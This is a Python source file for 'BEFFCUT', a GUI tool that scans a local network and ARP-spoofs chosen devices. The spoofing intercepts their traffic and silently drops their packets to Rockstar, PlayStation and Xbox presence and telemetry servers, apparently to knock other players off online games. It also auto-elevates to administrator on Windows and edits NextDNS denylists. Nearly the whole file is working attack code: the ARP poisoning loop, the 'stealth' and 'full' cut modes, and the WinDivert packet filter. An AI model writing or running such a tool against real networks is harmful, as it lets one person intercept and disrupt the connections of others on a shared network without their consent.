"""
BEFFCUT - Final Improved (Auto-elevate fixed, fast incremental LAN scan, vendor cache, single-instance relaunch)

Changes:
 - Fixed SyntaxError in log() function
 - Windows auto-elevate without double window
 - Fast incremental LAN scan + vendor cache
 - Stealth Cut & Full Cut modes
 - NextDNS integration intact with correct API usage
 - Fixed scapy "You should be providing Ethernet destination MAC" warnings
"""

import os
import sys
import json
import time
import threading
import datetime
import socket
import ipaddress
import atexit
from pathlib import Path
from queue import Queue, Empty
from concurrent.futures import ThreadPoolExecutor, as_completed

# GUI
import tkinter as tk
from tkinter import ttk

# Networking libs
try:
    import netifaces
    from scapy.all import ARP, Ether, srp, send
except Exception as e:
    print("Missing networking packages. Install scapy and netifaces. Error:", e)
    sys.exit(1)

try:
    import requests
except Exception:
    requests = None

try:
    import manuf
    manuf_lookup = manuf.MacParser()
except Exception:
    manuf_lookup = None

# Optional packet filter
has_pydivert = False
try:
    import pydivert
    has_pydivert = True
except Exception:
    has_pydivert = False

# ---------------- Config ----------------
CONFIG_PATH = Path("beffcut_config.json")
config = {
    "profile_id": "",
    "api_key": "",
    "link_url": "",
    "device_labels": {},
    "theme": "purple",
    "auto_elevate": True,
}
if CONFIG_PATH.exists():
    try:
        with open(CONFIG_PATH, 'r') as f:
            config.update(json.load(f))
    except Exception:
        pass

arp_spoofing = {}  # victim_ip -> threading.Event (stop_event)
filter_threads = {}
filter_flags = {}
resolved_ip_cache = {}
resolved_lock = threading.Lock()

vendor_cache = {}
scan_queue = Queue()

LOCAL_OUI = {
    "00:1E:3A": "Sony",
    "70:9E:29": "Sony",
    "F8:46:1C": "Sony",
    "28:18:78": "Microsoft",
    "B4:AE:2B": "Microsoft",
    "60:A4:4C": "Nintendo",
}

# -------- Utils --------
def save_config():
    try:
        with open(CONFIG_PATH, 'w') as f:
            json.dump(config, f, indent=2)
    except Exception:
        pass

def is_admin():
    if os.name == 'nt':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    else:
        try:
            return os.geteuid() == 0
        except Exception:
            return False

def try_elevate_windows_and_exit_parent():
    if os.name != 'nt':
        return False
    try:
        import ctypes
        executable = sys.executable
        params = ' '.join([f'"{p}"' for p in sys.argv])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, params, None, 1)
        time.sleep(0.5)
        sys.exit(0)
    except Exception:
        return False

if config.get('auto_elevate', True) and os.name == 'nt' and not is_admin():
    try_elevate_windows_and_exit_parent()

# --- UI Setup ---
root = tk.Tk()
root.title("BEFFCUT - ARP Spoof & LAN Scanner")
root.geometry("850x600")

log_box = tk.Text(root, height=10)
log_box.pack(fill='x', padx=8, pady=4)

tree = ttk.Treeview(root, columns=("IP", "MAC", "Label", "State", "Mode"), show='headings')
for col in ("IP", "MAC", "Label", "State", "Mode"):
    tree.heading(col, text=col)
    tree.column(col, width=150, anchor='center')
tree.pack(fill='both', expand=True, padx=8, pady=4)

button_frame = tk.Frame(root)
button_frame.pack(fill='x', pady=8)

btn_refresh = tk.Button(button_frame, text='Refresh Devices')
btn_refresh.pack(side='left', padx=4)

btn_lock = tk.Button(button_frame, text='Toggle Lock')
btn_lock.pack(side='left', padx=4)

btn_settings = tk.Button(button_frame, text='Settings')
btn_settings.pack(side='left', padx=4)

btn_block_rock = tk.Button(button_frame, text='Block Rockstar')
btn_block_rock.pack(side='left', padx=4)

btn_unblock_rock = tk.Button(button_frame, text='Unblock Rockstar')
btn_unblock_rock.pack(side='left', padx=4)

btn_link_ip = tk.Button(button_frame, text='Link IP')
btn_link_ip.pack(side='left', padx=4)

cut_mode_combo = ttk.Combobox(button_frame, values=['stealth', 'full'])
cut_mode_combo.current(0)
cut_mode_combo.pack(side='left', padx=4, pady=0)

# -------- Logging --------
def log(msg):
    ts = datetime.datetime.now().strftime('%H:%M:%S')
    try:
        log_box.insert(tk.END, f"[{ts}] {msg}\n")
        log_box.see(tk.END)
    except Exception:
        print(f"[{ts}] {msg}")

# -------- Vendor lookup --------
def vendor_from_mac(mac):
    mac = mac.upper()
    if mac in vendor_cache:
        return vendor_cache[mac]
    name = 'Unknown'
    if manuf_lookup:
        try:
            v = manuf_lookup.get_manuf(mac)
            if v:
                name = v
        except Exception:
            pass
    if name == 'Unknown':
        prefix = mac.replace('-', ':')[:8]
        name = LOCAL_OUI.get(prefix, 'Unknown')
    vendor_cache[mac] = name
    return name

# -------- LAN scan --------
def arp_probe(target, timeout=0.6):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target)
    try:
        resp = srp(pkt, timeout=timeout, verbose=0)[0]
        for _, rcv in resp:
            return {'ip': rcv.psrc, 'mac': rcv.hwsrc}
    except Exception:
        pass
    return None

def scan_network_interface(ip, mask, results_queue, timeout=0.6, max_workers=80):
    try:
        net = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
        hosts = [str(h) for h in net.hosts()]
    except Exception:
        return
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(arp_probe, h, timeout): h for h in hosts}
        for fut in as_completed(futures):
            r = None
            try:
                r = fut.result()
            except Exception:
                continue
            if r:
                results_queue.put(r)

def scan_lan_devices_background():
    while not scan_queue.empty():
        try:
            scan_queue.get_nowait()
        except Empty:
            break
    try:
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                for link in addrs[netifaces.AF_INET]:
                    ip = link.get('addr')
                    mask = link.get('netmask')
                    if not ip or ip.startswith('169.') or ip == '127.0.0.1':
                        continue
                    t = threading.Thread(target=scan_network_interface, args=(ip, mask, scan_queue), daemon=True)
                    t.start()
    except Exception as e:
        log(f"Scan error: {e}")

# -------- ARP spoof --------
def spoof_once(target_ip, target_mac, gateway_ip, spoof_mac=None):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    if spoof_mac:
        pkt[ARP].hwsrc = spoof_mac
    try:
        send(pkt, verbose=0)
    except Exception as e:
        log(f"ARP send error: {e}")

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    try:
        send(pkt, count=4, verbose=0)
    except Exception as e:
        log(f"ARP restore error: {e}")

def get_mac_safe(ip, fallback=None):
    entry = arp_probe(ip)
    if entry:
        return entry['mac']
    return fallback

def start_spoof_thread(victim_ip, victim_mac, mode="stealth", enable_filter=True):
    if victim_ip in arp_spoofing and arp_spoofing[victim_ip] and not arp_spoofing[victim_ip].is_set():
        log(f"ARP spoof already running for {victim_ip}")
        return

    try:
        gws = netifaces.gateways()
        gateway_ip = gws.get('default', {}).get(netifaces.AF_INET, [None])[0]
        if not gateway_ip:
            log("No default gateway found")
            return
    except Exception as e:
        log(f"Error getting gateway: {e}")
        return

    victim_mac = victim_mac or get_mac_safe(victim_ip)
    gateway_mac = get_mac_safe(gateway_ip, fallback="00:11:22:33:44:66")
    if not victim_mac or not gateway_mac:
        log("Failed to get MAC addresses for spoofing")
        return

    stop_event = threading.Event()
    arp_spoofing[victim_ip] = stop_event

    if enable_filter:
        start_filter_for_ip(victim_ip)

    def spoof_loop():
        log(f"Starting ARP spoof thread for {victim_ip} mode {mode}")
        try:
            while not stop_event.is_set():
                if mode == "stealth":
                    spoof_once(victim_ip, victim_mac, gateway_ip)
                    time.sleep(3)
                elif mode == "full":
                    spoof_once(victim_ip, victim_mac, gateway_ip)
                    spoof_once(gateway_ip, gateway_mac, victim_ip)
                    time.sleep(1)
                else:
                    spoof_once(victim_ip, victim_mac, gateway_ip)
                    time.sleep(3)
        except Exception as e:
            log(f"Exception in spoof loop: {e}")

    t = threading.Thread(target=spoof_loop, daemon=True)
    t.start()

def stop_spoof(victim_ip, victim_mac):
    stop_event = arp_spoofing.get(victim_ip)
    if stop_event:
        stop_event.set()
        gws = netifaces.gateways()
        gateway_ip = gws.get('default', {}).get(netifaces.AF_INET, [None])[0]
        if gateway_ip:
            gw_entry = arp_probe(gateway_ip)
            gateway_mac = gw_entry['mac'] if gw_entry else None
            if gateway_mac:
                restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        arp_spoofing.pop(victim_ip, None)

# -------- Domain resolution & filter helpers --------
def resolve_domain_to_ips(domain):
    with resolved_lock:
        if domain in resolved_ip_cache and time.time() - resolved_ip_cache[domain]['ts'] < 300:
            return resolved_ip_cache[domain]['ips']
    ips = set()
    try:
        for r in socket.getaddrinfo(domain, None):
            addr = r[4][0]
            try:
                ipaddress.IPv4Address(addr)
                ips.add(addr)
            except Exception:
                continue
    except Exception:
        pass
    with resolved_lock:
        resolved_ip_cache[domain] = {'ips': ips, 'ts': time.time()}
    return ips

def bulk_resolve(domains):
    all_ips = set()
    for d in domains:
        all_ips.update(resolve_domain_to_ips(d))
    return all_ips

ROCKSTAR_DOMAINS = [
    "prod.telemetry.ros.rockstargames.com",
    "psh.prod.ros.rockstargames.com",
    "tm.gta5-prod.ros.rockstargames.com",
]
PSN_DOMAINS = [
    "np.communication.playstation.net",
    "presence-heartbeat.playstation.net",
]
XBOX_DOMAINS = [
    "presence-heartbeat.xboxlive.com",
    "userpresence.xboxlive.com",
    "sessiondirectory.xboxlive.com",
]

def start_filter_for_ip(victim_ip):
    if os.name != 'nt' or not has_pydivert:
        log("Packet filtering requires Windows + pydivert (WinDivert)")
        return
    key = f"filter_{victim_ip}"
    if key in filter_threads:
        return
    domains = ROCKSTAR_DOMAINS + PSN_DOMAINS + XBOX_DOMAINS
    blocked_ips = set()
    try:
        blocked_ips.update(bulk_resolve(domains))
    except Exception:
        pass
    blocked_ips = {ip for ip in blocked_ips if not (ip.startswith('10.') or ip.startswith('192.168.') or ip.startswith('172.'))}
    filter_flags[key] = True

    def filter_worker():
        log(f"Filter started for {victim_ip} - blocking {len(blocked_ips)} IPs (stealth)")
        fstr = f"ip and (ip.SrcAddr == {victim_ip} or ip.DstAddr == {victim_ip})"
        try:
            with pydivert.WinDivert(fstr) as w:
                for pkt in w:
                    if not filter_flags.get(key):
                        break
                    try:
                        src_ip = pkt.src_addr
                        dst_ip = pkt.dst_addr
                    except Exception:
                        w.send(pkt)
                        continue
                    if dst_ip in blocked_ips or src_ip in blocked_ips:
                        continue
                    else:
                        w.send(pkt)
        except Exception as e:
            log(f"pydivert filter error: {e}")
        log(f"Filter stopped for {victim_ip}")

    t = threading.Thread(target=filter_worker, daemon=True)
    filter_threads[key] = t
    t.start()

def stop_filter_for_ip(victim_ip):
    key = f"filter_{victim_ip}"
    filter_flags[key] = False
    if key in filter_threads:
        del filter_threads[key]

# -------- NextDNS helpers --------
NEXTDNS_API_BASE = "https://api.nextdns.io"

def nextdns_headers():
    key = config.get('api_key', '')
    if not key:
        return {}
    return {"X-Api-Key": key, "Content-Type": "application/json"}

def call_link_url():
    url = config.get('link_url', '').strip()
    if not url:
        log("NextDNS Link URL not set in Settings.")
        return False
    if not requests:
        log("Missing requests library.")
        return False
    try:
        r = requests.get(url, timeout=10)
        if r.status_code in (200, 204):
            log("Linked IP updated via link URL (OK).")
            return True
        else:
            log(f"Link URL call failed: {r.status_code} {r.text}")
            return False
    except Exception as e:
        log(f"Link URL call exception: {e}")
        return False

def block_domains(domains):
    pid = config.get('profile_id', '').strip()
    if not pid or not config.get('api_key'):
        log("NextDNS Profile ID / API key missing in Settings")
        return
    for d in domains:
        try:
            url = f"{NEXTDNS_API_BASE}/profiles/{pid}/denylist"
            h = nextdns_headers()
            payload = {
                "id": d,
                "type": "domain"
            }
            r = requests.post(url, headers=h, json=payload, timeout=8)
            if r.status_code in (200, 201, 204):
                log(f"Blocked {d}")
            else:
                log(f"Failed block {d}: {r.status_code} {r.text}")
        except Exception as e:
            log(f"Exception blocking {d}: {e}")

def unblock_domains(domains):
    pid = config.get('profile_id', '').strip()
    if not pid or not config.get('api_key'):
        log("NextDNS Profile ID / API key missing in Settings")
        return
    for d in domains:
        try:
            url = f"{NEXTDNS_API_BASE}/profiles/{pid}/denylist/{d}"
            h = nextdns_headers()
            r = requests.delete(url, headers=h, timeout=8)
            if r.status_code in (200, 204):
                log(f"Unblocked {d}")
            else:
                log(f"Failed unblock {d}: {r.status_code} {r.text}")
        except Exception as e:
            log(f"Exception unblocking {d}: {e}")

# -------- GUI Actions --------
def refresh_devices_thread():
    threading.Thread(target=scan_lan_devices_background, daemon=True).start()

    inserted = set()
    def poll_and_insert():
        try:
            while True:
                item = scan_queue.get_nowait()
                ip = item['ip']
                mac = item['mac']
                if ip in inserted:
                    continue
                inserted.add(ip)
                label = config.get('device_labels', {}).get(ip, vendor_from_mac(mac))
                tree.insert('', 'end', values=(ip, mac, label, 'Unlocked', 'none'))
        except Empty:
            pass
        root.after(300, poll_and_insert)
    poll_and_insert()
    log("Background scan started... results will appear incrementally")

def on_refresh():
    tree.delete(*tree.get_children())
    refresh_devices_thread()

btn_refresh.config(command=on_refresh)

def toggle_lock():
    sel = tree.selection()
    if not sel: return
    item = tree.item(sel[0])
    ip, mac, label, state, mode = item['values']
    chosen = cut_mode_combo.get() if hasattr(cut_mode_combo, 'get') else 'stealth'
    if state == 'Unlocked':
        start_spoof_thread(ip, mac, mode=chosen)
        tree.item(sel[0], values=(ip, mac, label, 'Locked', chosen))
        log(f"Started ARP spoof ({chosen}) on {ip}")
    else:
        stop_spoof(ip, mac)
        tree.item(sel[0], values=(ip, mac, label, 'Unlocked', 'none'))
        log(f"Stopped ARP spoof on {ip}")

btn_lock.config(command=toggle_lock)

def rename_popup():
    sel = tree.selection()
    if not sel: return
    item = tree.item(sel[0])
    ip = item['values'][0]
    win = tk.Toplevel(root)
    win.title('Rename Device')
    win.geometry('260x120')
    tk.Label(win, text='New label').pack()
    e = tk.Entry(win)
    e.pack()
    def set_label():
        label = e.get().strip()
        if label:
            config.setdefault('device_labels', {})[ip] = label
            save_config()
            tree.item(sel[0], values=(ip, item['values'][1], label, item['values'][3], item['values'][4]))
        win.destroy()
    tk.Button(win, text='Set', command=set_label).pack(pady=8)

tree.bind("<Double-1>", lambda e: rename_popup())

def settings_popup():
    win = tk.Toplevel(root)
    win.title('Settings')
    win.geometry('480x300')
    tk.Label(win, text='NextDNS Profile ID').pack()
    e1 = tk.Entry(win)
    e1.insert(0, config.get('profile_id', ''))
    e1.pack(fill='x')
    tk.Label(win, text='NextDNS API Key').pack()
    e2 = tk.Entry(win)
    e2.insert(0, config.get('api_key', ''))
    e2.pack(fill='x')
    tk.Label(win, text='NextDNS Link URL').pack()
    e3 = tk.Entry(win)
    e3.insert(0, config.get('link_url', ''))
    e3.pack(fill='x')
    auto_var = tk.BooleanVar(value=config.get('auto_elevate', True))
    tk.Checkbutton(win, text='Auto-elevate (Windows)', var=auto_var).pack(pady=6)
    def save_and_close():
        config['profile_id'] = e1.get().strip()
        config['api_key'] = e2.get().strip()
        config['link_url'] = e3.get().strip()
        config['auto_elevate'] = auto_var.get()
        save_config()
        log('[SETTINGS SAVED]')
        win.destroy()
    tk.Button(win, text='Save', command=save_and_close).pack(pady=8)

btn_settings.config(command=settings_popup)

btn_block_rock.config(command=lambda: threading.Thread(target=lambda: block_domains(ROCKSTAR_DOMAINS), daemon=True).start())
btn_unblock_rock.config(command=lambda: threading.Thread(target=lambda: unblock_domains(ROCKSTAR_DOMAINS), daemon=True).start())
btn_link_ip.config(command=lambda: threading.Thread(target=call_link_url, daemon=True).start())

# -------- Cleanup --------
def cleanup():
    for stop_event in arp_spoofing.values():
        try:
            stop_event.set()
        except Exception:
            pass
    for key in list(filter_flags.keys()):
        filter_flags[key] = False
    log("Cleanup complete")

atexit.register(cleanup)

# -------- Initial scan on app start --------
threading.Thread(target=scan_lan_devices_background, daemon=True).start()

root.mainloop()